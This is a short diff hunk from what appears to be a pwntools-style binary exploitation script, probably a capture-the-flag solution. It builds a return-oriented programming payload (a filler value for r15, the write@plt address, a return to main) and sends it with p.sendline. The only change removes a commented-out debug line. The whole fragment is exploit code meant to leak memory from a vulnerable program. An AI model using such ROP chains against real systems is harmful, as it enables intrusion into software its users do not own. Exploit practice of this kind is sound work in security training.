@@ -46,8 +46,6 @@ payload += deadcode           # r15; doesnt matter
 payload += write_plt          # function to exec
 payload += main_func          # ret back to main
 
-# sys.stdout.buffer.write(payload)
-
 print("Sending payload 1")
 p.sendline(payload)
 
